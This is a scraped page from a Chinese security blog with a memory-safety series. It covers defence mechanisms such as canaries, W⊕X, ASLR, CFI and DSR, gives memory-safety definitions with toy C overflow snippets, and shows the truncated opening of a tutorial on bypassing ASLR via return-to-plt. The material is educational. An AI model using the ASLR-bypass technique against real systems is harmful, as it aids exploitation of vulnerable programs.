<p>继前两篇文章 <a href="http://www.csyssec.org/20170101/memorysafety/" target="_blank" rel="external">内存持久战-内存安全性</a>, <a href="http://www.csyssec.org/20170101/memorysafety-attack/" target="_blank" rel="external">内存持久战-攻击模型</a>, 再加上防御措施，才能算是完整的内存战争。本文首先介绍目前广泛部署的防御机制，然后根据 <a href="http://www.csyssec.org/20170101/memorysafety-attack/" target="_blank" rel="external">内存持久战-攻击模型</a> 每一步实施的攻击破坏介绍相对应的防御细节。</p>
<h3 id="0X01-广泛部署的防御机制"><a href="#0X01-广泛部署的防御机制" class="headerlink" title="0X01 广泛部署的防御机制"></a>0X01 广泛部署的防御机制</h3><p>目前广泛部署的防御机制有栈粉碎性保护（Stack smashing protection)，DEP/W⊕X以及ASLR(Address Space Layout Randomization)。针对Windows平台，也提出了一些特殊的机制，比如 SafeSEH 与 SEHOP 用来保护堆的元数据和异常处理器。</p>
<p>栈粉碎性保护,SafeSEH以及SEHOP的基本思想是在返回地址与缓冲区(比如函数入口）之间放置随机数作为哨兵（称为cookie或canary),在函数返回前先检测哨兵的值是否被篡改，以达到检测缓冲区溢出攻击的目的。这些机制都属于代码指针保护方式（code pointer integrity),主要检测一些特殊代码指针，如栈上的返回地址、异常处理器指针的完整性，然而对于直接修改（比如索引错误）却无能为力。有关stack smashing 可参考这篇文章 <a href="http://www.drdobbs.com/security/anatomy-of-a-stack-smashing-attack-and-h/240001832?pgno=1" target="_blank" rel="external">Anatomy of a Stack Smashing Attack and How GCC Prevents It
</a></p>
<p>W⊕X（write XOR executable)属于DEP（data execution prevention)的子集，是不可执行数据（Non-executable data）与代码完整性(code integrity)的结合。所有现代CPU都支持设置不可执行页面权限，结合不可写代码权限，就可以实施W⊕X机制，很简单也很实际。然而无法防御ROP（return oriented programming),ROP指的是在将现有代码中的可复用代码（可以是现有的函数）以及一些指令序列（gadgets)连接起来实施恶意操作。有关ROP可参考这篇文章，<a href="https://www.blackhat.com/presentations/bh-usa-08/Shacham/BH_US_08_Shacham_Return_Oriented_Programming.pdf" target="_blank" rel="external">Return-oriented Programming:<br>Exploitation without Code Injection</a>.</p>
<p>ASLR在下文会详细描述。</p>
<h3 id="0X02-防御机制Step-by-step"><a href="#0X02-防御机制Step-by-step" class="headerlink" title="0X02 防御机制Step-by-step"></a>0X02 防御机制Step-by-step</h3><p>从目前提出的所有防御机制来看，可将其划分为两大类：概率性以及确定性防御。概率性机制用来随机化一些对象，如ISR(Instruction Set Randomization), ASLR(Address Space Randomizatioin)以及DSR(Data Space Randomization),可选手段相对较少。 确定性防御机制实施reference monitor, 有关reference monitor的定义可参考，<a href="https://en.wikipedia.org/wiki/Reference_monitor" target="_blank" rel="external">wikipedia page on reference monior</a>, 主要就是在参考验证机制上定义了一些设计要求。 其主要利用静态与动态注入技术，静态注入可在编译阶段实施，动态注入需要在运行时加入代码，损耗相对较大。有关注入技术，可参考前面的文章 <a href="http://www.chongh.wiki/blog/2015/12/18/pin-for-dynamic-binary-instrumentation/" target="_blank" rel="external">PIN for Dynamic Binary Instrumentation</a>。</p>
<p>下面将针对攻击模型中实施的每个步骤介绍相对应的防御机制，每种防御机制对应每一步的攻击过程。<br>可以先去回顾一下 <a href="http://www.csyssec.org/20170101/memorysafety-attack/" target="_blank" rel="external">内存持久战之攻击模型</a> 的完整实施过程。注意，以下介绍的防御机制并没有时序关系,以横向关系依次描述。</p>
<p><strong><em>Step 1&amp;2: Memory safety.</em></strong> 考虑完整的内存安全性，空间错误和时域错误都需要阻止。类型安全（Type-safe)的语言通过检查数组边界并使用自动垃圾回收来实施空间与时域安全性。对于非类型安全语言，可嵌入reference monitor针对非安全代码实施类似的策略，对象可以是源码、中间语言、二进制。</p>
<p>针对空间安全，可跟踪指针边界，将指针结构体的表示方法扩展，加入额外信息。但是这种需要源码标注(annotation)，对于庞大的代码基是不实用的，甚至会改变内存结构带来二进制兼容性问题。可参考 <a href="https://www.cs.virginia.edu/~weimer/p/p477-necula.pdf" target="_blank" rel="external">CCured</a> 项目。为解决兼容性问题，越来越多研究者开始追踪对象边界，不但要知道对象分配的内存区域边界，并利用指针运算而不是引用指针来保护指针边界。</p>
<p>然而，检测边界并不能解决use-after-free, double-free(use-after-free的特列)问题. 此时，实施时域安全可作为补充。1）特殊的分配器：释放的内存只能被同类型对象重用并对齐。此策略可阻止user-after-free攻击，但对dangling pointers无效；2）基于对象的方法：利用影子内存标记每一块释放的内存位置，如果访问最近被释放的空间就能被检测到。著名的Valgrind内存检测就是利用此方法来检测user-after-free错误的。有关Valgrind的内存检测技术将会在后续的文章<a href="http://www.chongh.wiki/blog/2016/02/20/valgrind-memory/" target="_blank" rel="external">Valgrind内存检测</a> 详细介绍。如果标记的内存区域重新被新的指针指向，对其的非法访问就检测不到了；3）基于指针的方法：同时维护指针的边界信息与内存分配信息实施全面的内存安全。</p>
<p><strong><em>Step 3: 代码完整性(code integrity, 对应修改代码),代码指针完整性(code pointer integrity，对应修改代码指针)以及数据完整性（data integrity，对应修改数据变量).</em></strong></p>
<p>代码完整性保证程序中的代码不可写性，可以将含有代码的所有内存页面设置为read-only,所有现代CPU都支持此操作。但是，代码完整性并不支持自我修改(self-modifying)的代码以及即时(Just-In-Time, JIT)编译。代码指针完整性保护指针不被修改，对于不变指针，如全局偏移表、虚拟函数表（vtable),可将其内存页设置read-only。但大部分指针，如定义的函数指针或保存的返回地址必须是可写的。另外，就算内存中所有的函数指针都能实施代码指针完整性，并不能防御use-after-free攻击，例如，通过悬挂指针读取错误的vtable<br>来改变程序的控制流并不会涉及内存中的覆盖代码指针操作。</p>
<p>数据完整性的实施近似空间安全保护，但并没有实施时域安全保护。数据完整性包括基于对象的完整性保护以及基于points-to集合的完整性保护。基于对象的完整性保护利用静态指针分析来鉴别出不安全的指针集(比如可能会越界的指针)以及指针的points-to集合，然后在代码中插入用影子内存跟踪对象的创建与释放的代码，当对不安全的指针进行写操作或引用操作时会检测指针的位置是否标记在影子内存中。基于points-to集合的完整性保护在基于对象的完整性保护上加了一个限制，每个解引用只能写它自己指向的集合对象，是对其保护的加强。</p>
<p><strong><em>Step 4: ISR(对应指针转向攻击者特定代码),ASLR（对应指向shellcode或者gadget的地址),DSR(对应解析输出的数据变量).</em></strong></p>
<p>ISR随机化系统指令来保护代码破坏攻击，随着硬件的更新与发展,ISR技术已经废弃；ASLR随机化代码和数据的存储位置来防御控制流劫持攻击，如果payload(指恶意代码中执行恶意操作的部分）在虚拟内存空间的地址不是固定的，攻击者就无法转移控制流。ASLR也是目前用来保护劫持攻击运用最广泛的技术，然后ASLR的随机化是可预测的，尤其是32位机器，heap-spraying以及JIT-spraying技术可以多次填充payload使随机化失效；</p>
<p>DSR将存储在内存中的数据形式，而不是存储位置，进行随机化。它为每个变量,包括指针，生成不同的key并进行加密操作，数据的每次读取/存储操作都多了个加解密过程。该方法在代码注入之前都要对指针进行静态分析，overhead较大，但保护比较健壮，能有效防止信息泄露，还能防御控制流劫持以及数据攻击。</p>
<p><strong><em>Step 5: 控制流完整性（control-flow integrity,对应利用间接跳转指令 call/jump 引用指针，利用返回指令引用指针)以及数据流完整性(data-flow integrity，对应引用破坏后的数据变量).</em></strong></p>
<p>控制流完整性包括动态返回完整性以及静态控制流图完整性。前文提到的栈粉碎性保护机制不能保护间接调转（call and jump)，不能防御直接修改破坏以及信息泄露，但开销小，兼容性好，所以运用比较广泛。影子栈技术能够解决栈粉碎性保护的信息泄露以及直接修改破坏问题，它把返回地址存入隔离的影子栈中，当函数返回时，对原有栈和影子栈两处保存的值做比较，已保证不被篡改。为了防御控制流劫持，不但要保护返回值，还要保护间接跳转，静态控制流图完整性的方式标记所有的call,jump，并将其标记信息存储在特殊的影子内存中或直接放进代码里; 数据流完整性在数据被使用前，通过检查read指令检测数据是否被破坏。它使用静态points-to分析构建一个全局的可达定义集合（reaching definition sets)，保证数据变量最近一次被写是通过程序中的写指令写入的，而不是攻击者可控制的写入。有关reaching definition sets的定义可参考 <a href="https://en.wikipedia.org/wiki/Reaching_definition" target="_blank" rel="external">wikipedia page on Reaching definition</a>.</p>
<p><strong><em>Step 6: 不可写数据策略(Non-executable data,对应执行注入的shellcode).</em></strong><br>Non-executable data 保护栈、堆之类的内存页面不可执行，只需要设置内存页面的执行位即可。实际上Non-executable data策略与代码完整性结合就是W⊕X机制。</p>
<p>每个攻击过程对应的防御机制都已讲完。横向来看，所有攻击模型的每个步骤都有多个防御方法；纵向来看，每种攻击在不同的实施阶段也有不同的防御方法，如控制流劫持攻击，从Step1-6分别有，内存安全性机制（step 1-2),代码指针完整性(step 3),ASLR(step 4), 控制流完整性（step 5）以及不可写数据策略（step 6)不同的防御机制。要阻止某种攻击或多种攻击，需要结合多种防御机制，每种机制也都有其优势与弱点。评判防御机制的性质，可从以下方面去衡量，保护强度、误报率、漏报率、性能开销、内存开销、兼容性，是否模块化等。</p>
<p>至此，内存持久战系列文章就到这里了，水平有限，很多不到位的地方欢迎补充修正。 回顾一下，最后用下面这张图总结，就清晰明了了。</p>
<figure><br>    <a href="http://7xppf1.com1.z0.glb.clouddn.com/memorywar.png" target="_blank" rel="external"><img src="http://7xppf1.com1.z0.glb.clouddn.com/memorywar.png" width="450"></a><br>    <figcaption></figcaption><br></figure>

<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="http://www.drdobbs.com/security/anatomy-of-a-stack-smashing-attack-and-h/240001832?pgno=1" target="_blank" rel="external">Anatomy of a Stack Smashing Attack and How GCC Prevents It
</a></p>
<p><a href="https://www.blackhat.com/presentations/bh-usa-08/Shacham/BH_US_08_Shacham_Return_Oriented_Programming.pdf" target="_blank" rel="external">Return-oriented Programming: Exploitation without Code Injection</a>.</p>
<p><a href="https://en.wikipedia.org/wiki/Reference_monitor" target="_blank" rel="external">wikipedia page on reference monior</a></p>
<p><a href="https://www.cs.virginia.edu/~weimer/p/p477-necula.pdf" target="_blank" rel="external">CCured</a></p>
<p><a href="https://nebelwelt.net/publications/files/13Oakland.pdf" target="_blank" rel="external">S&amp;P’13 Eternal War in Memory </a></p>
<p>作者[@diting0x] 于Lawson computer science building</p>
<hr>
<p><strong>转载本文请务必注明</strong>，文章出处：《<a href="http://www.csyssec.org/20170101/memorysafety-defense/" target="_blank" rel="external">内存持久战之防御措施</a>》与作者信息：<a href="http://weibo.com/diting0x" target="_blank" rel="external">Diting0x</a></p>

      
    </div>
    <footer class="entry-meta entry-footer">
      
	<span class="ico-folder"></span>
    <a class="article-category-link" href="/categories/内存安全/">内存安全</a>

      
  <span class="ico-tags"></span>
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Memory/">Memory</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Security/">Security</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/System/">System</a></li></ul>

      
    </footer>
  </div>
  
</article>

<!-- Table of Contents -->

  
    <article id="post-memorysafety-attack"  class="article article-type-post" itemscope itemprop="blogPost" >
  <div id="articleInner" class="clearfix post-1016 post type-post status-publish format-standard has-post-thumbnail hentry category-template-2 category-uncategorized tag-codex tag-edge-case tag-featured-image tag-image tag-template">
    
    
      <header class="article-header">
        
  
    <h1 class="thumb" itemprop="name">
      <a class="article-title" href="/20170101/memorysafety-attack/">内存持久战之攻击模型</a>
    </h1>
  

      </header>
    
    <div class="article-meta">
      
	Posted on <a href="/20170101/memorysafety-attack/" class="article-date">
	  <time datetime="2017-01-01T04:29:44.000Z" itemprop="datePublished">一月 1, 2017</time>
	</a>

    </div>
    <div class="article-entry" itemprop="articleBody">
      
        

          
            <div class="entry-summary" style="margin-left:0;">
            作者：Diting0x

CSysSec注： 本系列文章来自Diting0x的个人博客，主要介绍内存的安全性问题，以及相应的攻击模型及防御措施，对整个系统安全问题的概览有很大的帮助。转载本文请务必注明，文章出处：《内存持久战之攻击模型》与作者信息：Diting0x



0X01 基本攻击模型
0X02 构建攻击模型


内存破坏是计算机安全中亘古不变的话题。内存破坏也被看作是top three危险的软件错误。像C/C++这种底层语言很容易引来这些bugs. 这些程序语言无法对内存安全性的保证，以至于让一些攻击者利用内存bugs改变程序行为或甚至控制整个控制流（control-flow).  要了解什么是内存安全性，可参考上一篇文章：内存持久战-内存安全性.  然而，一种最显而易见的解...
          

        
          <p class="article-more-link">
            <a href="/20170101/memorysafety-attack/#more">阅读全文</a>
          </p>
        </div>
      
    </div>
    <footer class="entry-meta entry-footer">
      
	<span class="ico-folder"></span>
    <a class="article-category-link" href="/categories/内存安全/">内存安全</a>

      
  <span class="ico-tags"></span>
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Memory/">Memory</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Security/">Security</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/System/">System</a></li></ul>

      
    </footer>
  </div>
  
</article>

<!-- Table of Contents -->

  
    <article id="post-memorysafety"  class="article article-type-post" itemscope itemprop="blogPost" >
  <div id="articleInner" class="clearfix post-1016 post type-post status-publish format-standard has-post-thumbnail hentry category-template-2 category-uncategorized tag-codex tag-edge-case tag-featured-image tag-image tag-template">
    
    
      <header class="article-header">
        
  
    <h1 class="thumb" itemprop="name">
      <a class="article-title" href="/20170101/memorysafety/">内存持久战之内存安全性</a>
    </h1>
  

      </header>
    
    <div class="article-meta">
      
	Posted on <a href="/20170101/memorysafety/" class="article-date">
	  <time datetime="2017-01-01T04:10:20.000Z" itemprop="datePublished">一月 1, 2017</time>
	</a>

    </div>
    <div class="article-entry" itemprop="articleBody">
      
        <p>作者：<a href="http://weibo.com/diting0x" target="_blank" rel="external">Diting0x</a></p>
<hr>
<p><strong>CSysSec注</strong>： 本系列文章来自<a href="http://www.chongh.wiki/about/" target="_blank" rel="external">Diting0x</a>的<a href="http://www.chongh.wiki/blog/2016/02/18/memory-safety/" target="_blank" rel="external">个人博客</a>，主要介绍内存的安全性问题，以及相应的攻击模型及防御措施，对整个系统安全问题的概览有很大的帮助。<br><strong>转载本文请务必注明</strong>，文章出处：《<a href="http://www.csyssec.org/20170101/memorysafety" target="_blank" rel="external">内存持久战之内存安全性</a>》与作者信息：<a href="http://weibo.com/diting0x" target="_blank" rel="external">Diting0x</a></p>
<hr>
<blockquote>
<ul>
<li>IEEE Security&amp;Privacy’13</li>
<li>不访问未定义的内存</li>
<li>无限间距</li>
<li>Pointers as capabilities</li>
</ul>
</blockquote>
<p>C语言中的buffer overflows, format string attacks等其它的一些vulnerabilities都有一个共同的问题：违背内存安全(Memory Safety)。本文主要讲述如何准确定义内存安全，为什么这些vulnerabilities违背了内存安全。 也为后续两篇文章<a href="http://www.csyssec.org/20170101/memorysafety-attack" target="_blank" rel="external">内存持久战-攻击模型</a>，<a href="http://www.csyssec.org/20170101/memorysafety-defense" target="_blank" rel="external">内存持久战-防御措施</a>做好铺垫。</p>
<h3 id="IEEE-Security-amp-Privacy’13"><a href="#IEEE-Security-amp-Privacy’13" class="headerlink" title="IEEE Security&amp;Privacy’13"></a>IEEE Security&amp;Privacy’13</h3><p>发表在IEEE Security&amp;Privacy’13的一篇SoK(Systematization of Knowledge)文章，<a href="https://nebelwelt.net/publications/files/13Oakland.pdf" target="_blank" rel="external">Eternal War in Memory </a>，阐述了一种定义内存安全的通用方法。<br><strong><em>Definition 1:</em></strong> 文中提到，一个程序的执行，只要不会出现以下内存访问错误，就是内存安全的：</p>
<ul>
<li>[X] 1.缓冲区溢出</li>
<li>[X] 2.引用空指针</li>
<li>[X] 3.释放后使用（use after free）</li>
<li>[X] 4.使用未初始化内存</li>
<li>[X] 5.非法释放已经释放过的指针或未分配的指针</li>
</ul>
<p>维基百科 <a href="https://en.wikipedia.org/wiki/Memory_safety" target="_blank" rel="external">wikipedia page on memory safety</a> 也有类似的定义。从定义来看，排除这些错误是内存安全本身的定义所导向的，而并非内存安全性的本质。那么，如何将这些错误统一起来？</p>
<h3 id="不访问未定义的内存"><a href="#不访问未定义的内存" class="headerlink" title="不访问未定义的内存"></a>不访问未定义的内存</h3><p>只有当程序访问未定义的内存时才会产生内存错误，这块内存是在程序中没有具体分配的，例如，<em>heap</em> 的一部分（通过<em>malloc</em>)，<em>stack</em>(作为局部变量或者函数参数），又或者是静态数据区域（作为全局变量). <a href="http://www.cs.berkeley.edu/~necula/" target="_blank" rel="external">George Necula</a> 在他的<em>CCured</em>项目中（旨在为C程序实施内存安全性）提到，一个内存安全的程序从来不会去访问未定义的内存。我们可以假设，内存可以无限的大，大到内存地址从不会复用(reused).如此一来，被释放的内存（可以调用<em>free</em> 或者从函数返回的时候<em>pop</em>）从不会被重新分配，并且会永久的保持未定义状态。</p>
<p><strong><em>Definition 2:</em></strong> 不访问未定义的内存就是内存安全的。<br>这种定义明显排除了<em>error 2</em> 和 <em>error 3</em>. 如果将<em>allocated</em> 的定义包括<em>initialized</em>，又可以排除<em>error 4</em>. 如果假设<em>free</em>只能在定义过的内存指针中调用，那又可以排除<em>error 5</em>. </p>
<p>不幸的是，<em>Definition 2</em> 并未排除缓冲区溢出错误，也就是<em>error 1</em>。 来看一个例子，假定一个标准<em>stack</em> 布局， 在此定义下，<em>program 1</em> 的执行会被认为是内存安全的：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">/* Program 1 */</div><div class="line">int x;</div><div class="line">int buf[4];</div><div class="line">buf[5] =3; /*overwrite*/</div></pre></td></tr></table></figure>
<p><em>Definition 2</em> 允许 <em>Program 1</em> 通过是因为此程序是在合法分配的内存中写数据，甚至写的数据类型也是正确的。但实际上问题在于，数组<em>buf</em> 的溢出将数据写进了变量<em>x</em> 中，显然这是内存不安全的。</p>
<p>###无限间距<br>将 <em>Definition 2</em> 延伸， <em>Program 1</em> 被看作是内存不安全的。只要加上这个假设： 内存区域分配的间距是无限大的。</p>
<p> <em>Buf</em> 和 <em>x</em> 的分配间距无限的大，<em>buf[5]</em> 将会访问 <em>buf</em> 区域的边界外部。边界外部是个未定义的内存区域，按照上述定义，就会产生错误。<em>heap</em> ,静态数据区域对溢出的处理方式类似。</p>
<p>尽管 <em>Definition 2</em> 是个很接近让人满意的定义，但事实并未如此。来看 <em>Program 1</em> 的变形 <em>Program 2</em>，也是一种缓冲区溢出, <em>Definition 2</em>  仍然会允许 <em>Program 2</em> 执行。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">/*Program 2 */</div><div class="line">struct foo &#123;</div><div class="line">   int buf[4];</div><div class="line">   int x;</div><div class="line">   &#125;;</div><div class="line">struct foo *pf -malloc(sizeof(struct foo));</div><div class="line">pf-&gt;buf[5] =3;/*overwrite pf-&gt;x*/</div></pre></td></tr></table></figure>
<p>这里，缓冲区溢出发生在 <em>object</em> 的内部。我们仍然可以类似的在域间引入无限间距的概念来排除缓冲区溢出的错误。这并未太背离现实，C标准允许编译器决定不同域的间距。另一方面，程序语言把结构体当做一个单独的<em>object</em> (从 <em>malloc</em> 返回的单独指针). 许多程序会把一个结构体映射到另一个结构体，或者会确定好一种间距方案。许多编译器都支持这些操作，但是否可以有一种更好的定义不依赖于这些？</p>
<h3 id="Pointers-as-capabilities"><a href="#Pointers-as-capabilities" class="headerlink" title="Pointers as capabilities"></a>Pointers as capabilities</h3><p>从 <em>Definition 2</em> 中，了解到许多概念，比如，定义的（分配的），未定义的（从没有分配的或者分配后回收的),我们假设分配后回收的内存不会再复用。如此一来，只要访问未定义的内存，就会违背内存安全性。</p>
<p><strong><em>Definition 3:</em></strong> 我们引入这么一个概念, Pointers as capabilities. 也就是说，允许指针的持有者访问一定区域中的内存。一个指针由三个元素组成<em>（p,b,e)</em>: <em>b</em> 定义有效的区域，<em>e</em> 定义边界，<em>p</em> 代表指针本身。 程序只能操作<em>p</em>，<em>b</em> 和<em>e</em> ,这样做只是为了定义一次执行是否是内存安全的。</p>
<p>举个例子，看下面的<em>Program 3</em>以及对应的内存效果图：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">/* Program 3 */</div><div class="line">struct foo &#123;</div><div class="line">  int x;</div><div class="line">  int y;</div><div class="line">  char *pc;</div><div class="line">&#125;;</div><div class="line">struct foo *pf = malloc(...);</div><div class="line">pf-&gt;x = 5;</div><div class="line">pf-&gt;y = 256;</div><div class="line">pf-&gt;pc = &quot;before&quot;;</div><div class="line">pf-&gt;pc += 3;</div><div class="line">int *px = &amp;pf-&gt;x;</div></pre></td></tr></table></figure>
<p><img src="http://7xppf1.com1.z0.glb.clouddn.com/memory-safety3.jpg" alt="memory-safety3"></p>
<p>重点关注代码的最后两行。<em>Program 3</em> 允许指针运算来新建一个新的指针，但只能当新指针落在b到e之间才能被解引用。从代码中看到，增加 <em>\</em>pc<em>的</em>p<em> ,新指针仍然落在</em>b<em> 和</em>e<em> 之间，所以执行</em>*(pf-&gt;pc)<em> 是合法有效的。但如果执行 </em>pf-&gt;pc+=10<em> , </em>*(pf-&gt;pc)<em> 将会违背内存安全性，尽管</em>pf-&gt;pc<em> 有可能碰巧就落在定义的内存区域中（这块内存区域可能分配给了其它</em>object*).</p>
<p>最后一行代码创建一个新的指针<em>px</em> 指向<em>pf</em> 指针的第一个域，将边界缩小到其中的一个域中。这就排除了 <em>Program 2</em> 带来的内存溢出问题。加入我们保留<em>pf</em>整个的边界，此程序可能会利用<em>px</em>溢出到结构体中的其它域中。</p>
<p>Capability是无法伪造的，就像我们并不能伪造一个指针映射到整形数据中。非法映射可以是直接的（<em>e.g. p=(int \</em>)5<em> ） 也可以是间接的，比如将含有整形数据的结构体映射到含有指针的结构体中（</em>e.g. p=(int **)pf<em> ), 将</em>Program 3<em> 中结构体中的第一个整形数据域映射成指针。我们的定义简单的将映射看作是空操作。只有有效的指针才能被解引用，一个指针的capabilities在它创建的时候就已经确定了。 我们的定义中允许 </em>Program 4* 的执行：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">/* Program 4 */</div><div class="line">int x;</div><div class="line">int *p = &amp;x;</div><div class="line">int y = (int)p;</div><div class="line">int *q = (int *)y</div><div class="line">*q = 5;</div></pre></td></tr></table></figure>
<p><em>p</em> 指针初始化得<em>b</em> 和<em>e</em> 一直会保持不变，尽管之后<em>p</em> 被转化成整形y, 因此当<em>y</em> 被转回为<em>q</em> 并被解引用的时候，指针依然存在。从另一方面来看，如果在<em>Program 3</em> 的最后加上 <em>p=(int \</em>*)pf<em> , 紧接着 </em>*p=malloc(sizeof(int))<em>， 之后的操作 </em>**p<em>以及</em>printf(“%d\n”,pf-&gt;x)* 都是合法的。也就是说，一块内存区域一开始存储了整形数据，之后也可将整形数据修改为指向整形数据的指针，然后解引用指针，这样操作是安全的，但反过来却不行。</p>
<p>在某种意义上来说，基于capability定义的内存安全性是一种类型安全形式（type safety)。这里只有两种类型：指针类型和非指针类型。这种定义保证了 1) 指针只在定义了合法内存区域的安全模式下被创建. 2) 指针只有在它们是指向分配给它们的内存区域的情况下被解引用. 3) 那块内存区域仍然是定义过的。这种定义排除了上述所有的五种错误。</p>
<p>注：本文主要意译 PL Enthusiast 上的一篇文章： <a href="http://www.pl-enthusiast.net/2014/07/21/memory-safety/" target="_blank" rel="external">What is memory safety</a> </p>
<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="http://www.pl-enthusiast.net/2014/07/21/memory-safety/" target="_blank" rel="external">What is memory safety</a><br><a href="https://nebelwelt.net/publications/files/13Oakland.pdf" target="_blank" rel="external">S&amp;P’13 Eternal War in Memory </a></p>
<p>作者[@diting0x] 于2016年2月17日Lawson computer science building &amp;&amp; The lodge apartment</p>
<p>另，感谢<a href="https://nebelwelt.net/publications/files/13Oakland.pdf" target="_blank" rel="external">S&amp;P’13 Eternal War in Memory </a><br>的作者 <a href="https://nebelwelt.net" target="_blank" rel="external">Mathis Payer教授</a> 的某些答疑，感谢感谢好友 <a href="http://www.yebangyu.org/" target="_blank" rel="external">叶邦宇</a> 指出的一些勘误。</p>
<hr>
<p><strong>转载本文请务必注明</strong>，文章出处：《<a href="http://www.csyssec.org/20170101/memorysafety" target="_blank" rel="external">内存持久战之内存安全性</a>》与作者信息：<a href="http://weibo.com/diting0x" target="_blank" rel="external">Diting0x</a></p>

      
    </div>
    <footer class="entry-meta entry-footer">
      
	<span class="ico-folder"></span>
    <a class="article-category-link" href="/categories/内存安全/">内存安全</a>

      
  <span class="ico-tags"></span>
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Memory/">Memory</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Security/">Security</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/System/">System</a></li></ul>

      
    </footer>
  </div>
  
</article>

<!-- Table of Contents -->

  
    <article id="post-bypassaslr-returntoplt"  class="article article-type-post" itemscope itemprop="blogPost" >
  <div id="articleInner" class="clearfix post-1016 post type-post status-publish format-standard has-post-thumbnail hentry category-template-2 category-uncategorized tag-codex tag-edge-case tag-featured-image tag-image tag-template">
    
    
      <header class="article-header">
        
  
    <h1 class="thumb" itemprop="name">
      <a class="article-title" href="/20170101/bypassaslr-returntoplt/">绕过ASLR-第一篇章(return-to-plt)</a>
    </h1>
  

      </header>
    
    <div class="article-meta">
      
	Posted on <a href="/20170101/bypassaslr-returntoplt/" class="article-date">
	  <time datetime="2017-01-01T03:40:21.000Z" itemprop="datePublished">一月 1, 2017</time>
	</a>

    </div>
    <div class="article-entry" itemprop="articleBody">
      
        <p>作者: <a href="http://www.csyssec.org/about" target="_blank" rel="external">CSysSec出品</a></p>
<hr>
<p><strong>CSysSec注</strong>： 本系列文章译自安全自由工作者<a href="https://sploitfun.wordpress.com/about-2/" target="_blank" rel="external">Sploitfun</a>的漏洞利用系列博客，从经典栈缓冲区漏洞利用堆漏洞利用，循序渐进，是初学者不可多得的好材料，CSysSec计划在原基础上不断添加相关漏洞利用技术以及相应的Mitigation方法，欢迎推荐或自荐文章。<br><strong>转载本文请务必注明</strong>，文章出处：《<a href="http://www.csyssec.org/20170101/bypassaslr-returntoplt" target="_blank" rel="external">Linux(X86)漏洞利用系列-Return-to-libc链接绕过NX</a>》与作者信息：<a href="http://www.csyssec.org/about/" target="_blank" rel="external">CSysSec出品</a></p>
<hr>
<blockquote>
<ul>
<li>0x01 ASLR</li>
<li>0x02 Return-to-plt</li>
<li>0x03 调用‘function@PLT’</li>
</ul>
</blockquote>
<p><u>阅读基础</u>:<br>    <a href="http://www.csyssec.org/20161230/stackbufferflow" target="_blank" rel="external">经典栈缓冲区溢出</a><br><u>VM Setup</u>: Ubuntu 12.04(x86)</p>
<p>在前面的文章中，为了利用漏洞代码，攻击者需要知道：</p>
<ul>
<li>栈地址（为了跳转到shellcode中)</li>
<li>libc基地址(为了成功绕过NX)</li>
</ul>
<p>因此，为了防御攻击者的行为，安全研究人员提出一种漏洞利用缓解(exploit mitigation)方法: “ASLR”</p>
<h3 id="ASLR"><a href="#ASLR" class="headerlink" title="ASLR"></a>ASLR</h3><p>地址空间布局随机化(ASLR)是一种漏洞利用缓解方法，其可以随机化</p>
<ul>
<li>栈地址</li>
<li>堆地址</li>
<li>共享库地址</li>
</ul>
<p>上述地址一旦被随机化，尤其是当共享库地址被随机化时，由于攻击者需要知道libc的基地址，我们前面提到的绕过NX的方法不再有效。但这种缓解技术也不是完全安全的。</p>
<p>从<a href="">前文</a>中，我们已经知道exp.py中的 libc函数地址是以下面计算方式得到的：</p>
<pre><code>libc函数地址=libc基地址+函数偏移
</code></pre><p>这里</p>
<ul>
<li>由于随机化被关闭，libc基地址是个常量(在‘vuln’二进制文件中是0xb7e22000)</li>
<li>函数偏移也是常量(可以执行”readelf -s libc.so.6 | grep”获取)</li>
</ul>
<p>现在当我们利用以下命令打开全随机化选项时(full randomization)</p>
<pre><code>#echo 2 &gt; /proc/sys/kernel/randomize_va_space
</code></pre><p>libc基地址将会被随机化</p>
<p><u>注意</u>： 只有libc的基地址被随机化了，从基地址开始的一个特殊函数的偏移仍然是个常量！因此，尽管打开了ASLR,只要我们能利用下面三项技术绕过共享库基地址的随机化，漏洞程序仍然能被成功利用.</p>
<ul>
<li>Return-to-plt（<a href="http://www.csyssec.org/20170101/bypassaslr-returntoplt" target="_blank" rel="external">这篇文章</a>）</li>
<li>暴力破解(<a href="http://www.csyssec.org/20170101/bypassaslr-bruteforce" target="_blank" rel="external">第二篇章</a>)</li>
<li>GOT覆盖与GOR解引用(<a href="http://www.csyssec.org/20170101/bypassaslr-gotgor" target="_blank" rel="external">第三篇章</a>)</li>
</ul>
<h3 id="Return-to-plt"><a href="#Return-to-plt" class="headerlink" title="Return-to-plt"></a>Return-to-plt</h3><p>利用这项技术，攻击者返回到一个函数的PLT(其地址没有被随机化-在执行之前就可以知道)，而不是返回到libc函数(其地址被随机化了)。 由于’function@PLT’没有被随机化，攻击者不需要预测libc的基地址，而只要简单地返回到‘function@PLT’就可以调用这个’function’。</p>
<pre><code>什么是PLT,如何调用‘function@PLT&apos;来调用其中的&apos;function&apos;
